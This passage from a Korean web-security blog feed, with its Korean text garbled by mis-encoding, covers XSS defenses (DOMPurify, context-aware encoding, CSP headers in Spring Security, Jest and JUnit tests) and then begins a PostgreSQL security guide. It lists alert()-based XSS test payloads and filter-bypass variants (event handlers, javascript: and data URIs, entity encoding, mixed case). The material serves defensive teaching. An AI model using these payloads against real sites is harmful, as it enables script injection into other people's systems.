class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">clean</span> &#125;&#125; /&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- âœ… ì•ˆì „ - ìë™ ì´ìŠ¤ì¼€ì´í”„ --&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; userInput &#125;&#125;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- âŒ ìœ„í—˜ - HTML ì§ì ‘ ë Œë”ë§ --&gt;</span><br><span class="line">  &lt;div v-html=&quot;userInput&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- âœ… ì•ˆì „ - ì •ì œ í›„ ì‚¬ìš© --&gt;</span><br><span class="line">  &lt;div v-html=&quot;sanitizedInput&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import DOMPurify from &#x27;dompurify&#x27;;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  props: [&#x27;userInput&#x27;],</span><br><span class="line">  computed: &#123;</span><br><span class="line">    sanitizedInput() &#123;</span><br><span class="line">      return DOMPurify.sanitize(this.userInput);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="ğŸ¯-ì‹¤ì „-ë°©ì–´-ì „ëµ"><a href="#ğŸ¯-ì‹¤ì „-ë°©ì–´-ì „ëµ" class="headerlink" title="ğŸ¯ ì‹¤ì „ ë°©ì–´ ì „ëµ"></a>ğŸ¯ ì‹¤ì „ ë°©ì–´ ì „ëµ</h2><h3 id="ê³„ì¸µë³„-ë°©ì–´-Defense-in-Depth"><a href="#ê³„ì¸µë³„-ë°©ì–´-Defense-in-Depth" class="headerlink" title="ê³„ì¸µë³„ ë°©ì–´ (Defense in Depth)"></a>ê³„ì¸µë³„ ë°©ì–´ (Defense in Depth)</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.</span> <span class="string">ì…ë ¥</span> <span class="string">ë‹¨ê³„</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">í´ë¼ì´ì–¸íŠ¸</span> <span class="string">ì¸¡</span> <span class="string">ê²€ì¦</span> <span class="string">(UX</span> <span class="string">ê°œì„ ìš©)</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">ì„œë²„</span> <span class="string">ì¸¡</span> <span class="string">ê²€ì¦</span> <span class="string">(í•„ìˆ˜)</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸</span> <span class="string">ê¸°ë°˜</span> <span class="string">ê²€ì¦</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="string">.</span> <span class="string">ì €ì¥</span> <span class="string">ë‹¨ê³„</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">ì¸ì½”ë”©ëœ</span> <span class="string">í˜•íƒœë¡œ</span> <span class="string">ì €ì¥</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">DB</span> <span class="string">íŒŒë¼ë¯¸í„°</span> <span class="string">ë°”ì¸ë”©</span> <span class="string">ì‚¬ìš©</span> <span class="string">(SQL</span> <span class="string">Injection</span> <span class="string">ë°©ì–´)</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="string">.</span> <span class="string">ì¶œë ¥</span> <span class="string">ë‹¨ê³„</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">í…œí”Œë¦¿</span> <span class="string">ì—”ì§„</span> <span class="string">ìë™</span> <span class="string">ì´ìŠ¤ì¼€ì´í”„</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">Context-aware</span> <span class="string">ì¸ì½”ë”©</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">DOMPurify</span> <span class="string">ë“±</span> <span class="string">ë¼ì´ë¸ŒëŸ¬ë¦¬</span> <span class="string">í™œìš©</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span><span class="string">.</span> <span class="string">ë¸Œë¼ìš°ì €</span> <span class="string">ë‹¨ê³„</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">CSP</span> <span class="string">í—¤ë”</span> <span class="string">ì„¤ì •</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">HttpOnly</span> <span class="string">ì¿ í‚¤</span></span><br><span class="line">   <span class="string">âœ…</span> <span class="string">X-XSS-Protection</span> <span class="string">í—¤ë”</span></span><br></pre></td></tr></table></figure><h3 id="Context-aware-ì¸ì½”ë”©"><a href="#Context-aware-ì¸ì½”ë”©" class="headerlink" title="Context-aware ì¸ì½”ë”©"></a>Context-aware ì¸ì½”ë”©</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML Context</span></span><br><span class="line"><span class="keyword">const</span> htmlEncoded = escapeHtml(userInput);</span><br><span class="line">element.<span class="property">textContent</span> = htmlEncoded;</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript Context</span></span><br><span class="line"><span class="keyword">const</span> jsEncoded = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(userInput);</span><br><span class="line"><span class="keyword">const</span> script = <span class="string">`var name = <span class="subst">$&#123;jsEncoded&#125;</span>;`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// URL Context</span></span><br><span class="line"><span class="keyword">const</span> urlEncoded = <span class="built_in">encodeURIComponent</span>(userInput);</span><br><span class="line"><span class="keyword">const</span> url = <span class="string">`https://example.com/search?q=<span class="subst">$&#123;urlEncoded&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CSS Context (ì‚¬ìš© ìµœì†Œí™”)</span></span><br><span class="line"><span class="keyword">const</span> cssEncoded = userInput.<span class="title function_">replace</span>(<span class="regexp">/[&lt;&gt;&quot;&#x27;]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="Spring-Security-í—¤ë”-ì„¤ì •"><a href="#Spring-Security-í—¤ë”-ì„¤ì •" class="headerlink" title="Spring Security í—¤ë” ì„¤ì •"></a>Spring Security í—¤ë” ì„¤ì •</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .headers(headers -&gt; headers</span><br><span class="line">                <span class="comment">// XSS ë³´í˜¸</span></span><br><span class="line">                .xssProtection(xss -&gt; xss</span><br><span class="line">                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">// CSP</span></span><br><span class="line">                .contentSecurityPolicy(csp -&gt; csp</span><br><span class="line">                    .policyDirectives(</span><br><span class="line">                        <span class="string">&quot;default-src &#x27;self&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;script-src &#x27;self&#x27; &#x27;nonce-&#123;nonce&#125;&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;img-src &#x27;self&#x27; data: https:; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;frame-ancestors &#x27;none&#x27;&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">// ê¸°íƒ€ ë³´ì•ˆ í—¤ë”</span></span><br><span class="line">                .frameOptions(frame -&gt; frame.deny())</span><br><span class="line">                .contentTypeOptions(Customizer.withDefaults())</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ğŸ§ª-XSS-ê³µê²©-í…ŒìŠ¤íŠ¸"><a href="#ğŸ§ª-XSS-ê³µê²©-í…ŒìŠ¤íŠ¸" class="headerlink" title="ğŸ§ª XSS ê³µê²© í…ŒìŠ¤íŠ¸"></a>ğŸ§ª XSS ê³µê²© í…ŒìŠ¤íŠ¸</h2><h3 id="í˜ì´ë¡œë“œ-ì˜ˆì‹œ"><a href="#í˜ì´ë¡œë“œ-ì˜ˆì‹œ" class="headerlink" title="í˜ì´ë¡œë“œ ì˜ˆì‹œ"></a>í˜ì´ë¡œë“œ ì˜ˆì‹œ</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ê¸°ë³¸ ìŠ¤í¬ë¦½íŠ¸ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ì´ë¯¸ì§€ íƒœê·¸ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- SVG íƒœê·¸ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ì´ë²¤íŠ¸ í•¸ë“¤ëŸ¬ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>hover me<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- JavaScript í”„ë¡œí† ì½œ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Data URI --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ì¸ì½”ë”© ìš°íšŒ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span>XSS<span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ëŒ€ì†Œë¬¸ì ìš°íšŒ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HTML ì—”í‹°í‹° --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ì†ì„± ì—†ëŠ” íƒœê·¸ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ìë™í™”-í…ŒìŠ¤íŠ¸"><a href="#ìë™í™”-í…ŒìŠ¤íŠ¸" class="headerlink" title="ìë™í™” í…ŒìŠ¤íŠ¸"></a>ìë™í™” í…ŒìŠ¤íŠ¸</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Jest + React Testing Library</span></span><br><span class="line"><span class="keyword">import</span> &#123; render, screen &#125; <span class="keyword">from</span> <span class="string">&#x27;@testing-library/react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;XSS ê³µê²©ì´ ì°¨ë‹¨ë˜ëŠ”ì§€ í™•ì¸&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> maliciousInput = <span class="string">&#x27;&lt;img src=x onerror=&quot;alert(\&#x27;XSS\&#x27;)&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> sanitized = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(maliciousInput);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">expect</span>(sanitized).<span class="property">not</span>.<span class="title function_">toContain</span>(<span class="string">&#x27;onerror&#x27;</span>);</span><br><span class="line">  <span class="title function_">expect</span>(sanitized).<span class="property">not</span>.<span class="title function_">toContain</span>(<span class="string">&#x27;alert&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;ì •ìƒì ì¸ HTMLì€ í—ˆìš©ë˜ëŠ”ì§€ í™•ì¸&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> safeInput = <span class="string">&#x27;&lt;b&gt;Hello&lt;/b&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> sanitized = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(safeInput);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">expect</span>(sanitized).<span class="title function_">toBe</span>(<span class="string">&#x27;&lt;b&gt;Hello&lt;/b&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JUnit + Spring Boot</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testXssProtection</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">maliciousComment</span> <span class="operator">=</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    mockMvc.perform(post(<span class="string">&quot;/api/comments&quot;</span>)</span><br><span class="line">            .contentType(MediaType.APPLICATION_JSON)</span><br><span class="line">            .content(<span class="string">&quot;&#123;\&quot;content\&quot;:\&quot;&quot;</span> + maliciousComment + <span class="string">&quot;\&quot;&#125;&quot;</span>))</span><br><span class="line">            .andExpect(status().isBadRequest())</span><br><span class="line">            .andExpect(jsonPath(<span class="string">&quot;$.message&quot;</span>)</span><br><span class="line">                .value(containsString(<span class="string">&quot;HTML íƒœê·¸ëŠ” í—ˆìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤&quot;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="âš ï¸-ì£¼ì˜ì‚¬í•­"><a href="#âš ï¸-ì£¼ì˜ì‚¬í•­" class="headerlink" title="âš ï¸ ì£¼ì˜ì‚¬í•­"></a>âš ï¸ ì£¼ì˜ì‚¬í•­</h2><h3 id="ì˜ëª»ëœ-ë°©ì–´-ë°©ë²•"><a href="#ì˜ëª»ëœ-ë°©ì–´-ë°©ë²•" class="headerlink" title="ì˜ëª»ëœ ë°©ì–´ ë°©ë²•"></a>ì˜ëª»ëœ ë°©ì–´ ë°©ë²•</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// âŒ ë¸”ë™ë¦¬ìŠ¤íŠ¸ ë°©ì‹ (ìš°íšŒ ê°€ëŠ¥)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">badFilter</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> input.<span class="title function_">replace</span>(<span class="regexp">/&lt;script&gt;/gi</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ìš°íšŒ: &lt;scr&lt;script&gt;ipt&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// âŒ ë¶ˆì™„ì „í•œ ì´ìŠ¤ì¼€ì´í”„</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">badEscape</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> input.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ëˆ„ë½: &#x27;, &quot;, &amp;, / ë“±</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// âŒ í´ë¼ì´ì–¸íŠ¸ ì¸¡ ê²€ì¦ë§Œ ì˜ì¡´</span></span><br><span class="line"><span class="comment">// ê³µê²©ìëŠ” ë¸Œë¼ìš°ì € ê°œë°œì ë„êµ¬ë¡œ ìš°íšŒ ê°€ëŠ¥</span></span><br></pre></td></tr></table></figure><h3 id="ì˜¬ë°”ë¥¸-ë°©ì–´-ë°©ë²•"><a href="#ì˜¬ë°”ë¥¸-ë°©ì–´-ë°©ë²•" class="headerlink" title="ì˜¬ë°”ë¥¸ ë°©ì–´ ë°©ë²•"></a>ì˜¬ë°”ë¥¸ ë°©ì–´ ë°©ë²•</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// âœ… í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ë°©ì‹</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">allowOnlyText</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> input.<span class="title function_">replace</span>(<span class="regexp">/[^\w\sê°€-í£]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// âœ… ì™„ì „í•œ HTML ì—”í‹°í‹° ì¸ì½”ë”©</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">properEscape</span>(<span class="params">text</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> text.<span class="title function_">replace</span>(<span class="regexp">/[&amp;&lt;&gt;&quot;&#x27;\/]/g</span>, <span class="function"><span class="params">char</span> =&gt;</span> (&#123;</span><br><span class="line">    <span class="string">&#x27;&amp;&#x27;</span>: <span class="string">&#x27;&amp;amp;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;&#x27;</span>: <span class="string">&#x27;&amp;lt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;&#x27;</span>: <span class="string">&#x27;&amp;gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&quot;&#x27;</span>: <span class="string">&#x27;&amp;quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&#x27;&amp;#039;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;&amp;#x2F;&#x27;</span></span><br><span class="line">  &#125;)[char]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// âœ… ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ìš©</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">DOMPurify</span> <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(input);</span><br></pre></td></tr></table></figure><h2 id="âœ…-ë³´ì•ˆ-ì²´í¬ë¦¬ìŠ¤íŠ¸"><a href="#âœ…-ë³´ì•ˆ-ì²´í¬ë¦¬ìŠ¤íŠ¸" class="headerlink" title="âœ… ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸"></a>âœ… ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸</h2><ul><li><input disabled="" type="checkbox"> ëª¨ë“  ì‚¬ìš©ì ì…ë ¥ì— ëŒ€í•´ ì„œë²„ ì¸¡ ê²€ì¦ ìˆ˜í–‰</li><li><input disabled="" type="checkbox"> ì¶œë ¥ ì‹œ ìë™ ì´ìŠ¤ì¼€ì´í”„ ì ìš© (í…œí”Œë¦¿ ì—”ì§„)</li><li><input disabled="" type="checkbox"> CSP í—¤ë” ì„¤ì •</li><li><input disabled="" type="checkbox"> HttpOnly, Secure ì¿ í‚¤ ì‚¬ìš©</li><li><input disabled="" type="checkbox"> innerHTML, dangerouslySetInnerHTML ì‚¬ìš© ìµœì†Œí™”</li><li><input disabled="" type="checkbox"> eval(), setTimeout(string), Function(string) ì‚¬ìš© ê¸ˆì§€</li><li><input disabled="" type="checkbox"> DOMPurify ê°™ì€ ê²€ì¦ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ìš©</li><li><input disabled="" type="checkbox"> ì •ê¸°ì ì¸ ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ë° ì½”ë“œ ë¦¬ë·°</li><li><input disabled="" type="checkbox"> í”„ë ˆì„ì›Œí¬ ë° ë¼ì´ë¸ŒëŸ¬ë¦¬ ìµœì‹  ë²„ì „ ìœ ì§€</li><li><input disabled="" type="checkbox"> HTTPS ì‚¬ìš© ê°•ì œ</li></ul><h2 id="ğŸ“-ê²°ë¡ "><a href="#ğŸ“-ê²°ë¡ " class="headerlink" title="ğŸ“ ê²°ë¡ "></a>ğŸ“ ê²°ë¡ </h2><p>XSSëŠ” <strong>ì‚¬ìš©ì ì…ë ¥ì„ ì‹ ë¢°í•˜ì§€ ì•ŠëŠ” ê²ƒ</strong>ì´ í•µì‹¬ì…ë‹ˆë‹¤.</p><p><strong>í•µì‹¬ ë°©ì–´ ì›ì¹™:</strong></p><ol><li><strong>ì…ë ¥ ê²€ì¦</strong> - ì„œë²„ì—ì„œ ëª¨ë“  ì…ë ¥ ê²€ì¦</li><li><strong>ì¶œë ¥ ì¸ì½”ë”©</strong> - Context-aware ì¸ì½”ë”© ì ìš©</li><li><strong>CSP ì„¤ì •</strong> - ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ì œì–´</li><li><strong>HttpOnly ì¿ í‚¤</strong> - JavaScriptë¡œ ì¿ í‚¤ ì ‘ê·¼ ì°¨ë‹¨</li><li><strong>ë¼ì´ë¸ŒëŸ¬ë¦¬ í™œìš©</strong> - DOMPurify ë“± ê²€ì¦ëœ ë„êµ¬ ì‚¬ìš©</li></ol><p>ë‹¨ì¼ ë°©ì–´ë³´ë‹¤ëŠ” **ì—¬ëŸ¬ ê³„ì¸µì˜ ë°©ì–´(Defense in Depth)**ë¥¼ êµ¬ì¶•í•˜ì—¬<br>í•˜ë‚˜ê°€ ëš«ë ¤ë„ ë‹¤ë¥¸ ë°©ì–´ì„ ì—ì„œ ë§‰ì„ ìˆ˜ ìˆë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Security/">Security</category>
      
      
      <category domain="https://ckck803.github.io/tags/Web-Security/">Web Security</category>
      
      <category domain="https://ckck803.github.io/tags/XSS/">XSS</category>
      
      <category domain="https://ckck803.github.io/tags/JavaScript/">JavaScript</category>
      
      <category domain="https://ckck803.github.io/tags/CSP/">CSP</category>
      
      
      <comments>https://ckck803.github.io/2025/12/04/security/xss/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[PostgreSQL] ì‚¬ìš©ìë³„ ë³´ì•ˆ ì„¤ì • ê°€ì´ë“œ</title>
      <link>https://ckck803.github.io/2025/12/01/database/postgresql/user-security-settings/</link>
      <guid>https://ckck803.github.io/2025/12/01/database/postgresql/user-security-settings/</guid>
      <pubDate>Sun, 30 Nov 2025 15:00:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/database/postgresql-logo.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;ğŸ”’-PostgreSQL-ì‚¬ìš©ìë³„-ë³´ì•ˆ-ì„¤ì •-ì™„ë²½-ê°€ì´ë“œ&quot;&gt;&lt;a href=&quot;#ğŸ”’-PostgreSQL-ì‚¬ìš©ìë³„-ë³´ì•ˆ-ì„¤ì •-ì™„ë²½-ê°€ì´ë“œ&quot; class=&quot;headerlink&quot; title=&quot;ğŸ”’ PostgreSQL ì‚¬ìš©ìë³„ ë³´ì•ˆ ì„¤ì • ì™„ë²½ ê°€ì´ë“œ&quot;&gt;&lt;/a&gt;ğŸ”’ PostgreSQL ì‚¬ìš©ìë³„ ë³´ì•ˆ ì„¤ì • ì™„ë²½ ê°€ì´ë“œ&lt;/h2&gt;&lt;p&gt;PostgreSQLì—ì„œëŠ” ì‚¬ìš©ì(Role)ë³„ë¡œ ë‹¤ì–‘í•œ ë³´ì•ˆ ì„¤ì •ì„ ì ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì•ˆì „í•˜ê²Œ ë³´í˜¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;br&gt;ì´ ë¬¸ì„œì—ì„œëŠ” ì„¸ì…˜ íƒ€ì„ì•„ì›ƒë¶€í„° ì ‘ì† ì œí•œ, ê¶Œí•œ ê´€ë¦¬ê¹Œì§€ ì‹¤ë¬´ì—ì„œ ê¼­ í•„ìš”í•œ ë³´ì•ˆ ì„¤ì •ë“¤ì„ ì •ë¦¬í•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;1ï¸âƒ£-ì„¸ì…˜-íƒ€ì„ì•„ì›ƒ-ì„¤ì •&quot;&gt;&lt;a href=&quot;#1ï¸âƒ£-ì„¸ì…˜-íƒ€ì„ì•„ì›ƒ-ì„¤ì •&quot; class=&quot;headerlink&quot; title=&quot;1ï¸âƒ£ ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ì„¤ì •&quot;&gt;&lt;/a&gt;1ï¸âƒ£ ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ ì„¤ì •&lt;/h2&gt;&lt;h3 id=&quot;âœ…-idle-session-timeout-PostgreSQL-14&quot;&gt;&lt;a href=&quot;#âœ…-idle-session-timeout-PostgreSQL-14&quot; class=&quot;headerlink&quot; title=&quot;âœ… idle_session_timeout (PostgreSQL 14+)&quot;&gt;&lt;/a&gt;âœ… idle_session_timeout (PostgreSQL 14+)&lt;/h3&gt;&lt;p&gt;ìœ íœ´ ì„¸ì…˜ì„ ìë™ìœ¼ë¡œ ì¢…ë£Œí•˜ì—¬ ë¶ˆí•„ìš”í•œ ì—°ê²°ì„ ì •ë¦¬í•©ë‹ˆë‹¤.&lt;/p&gt;
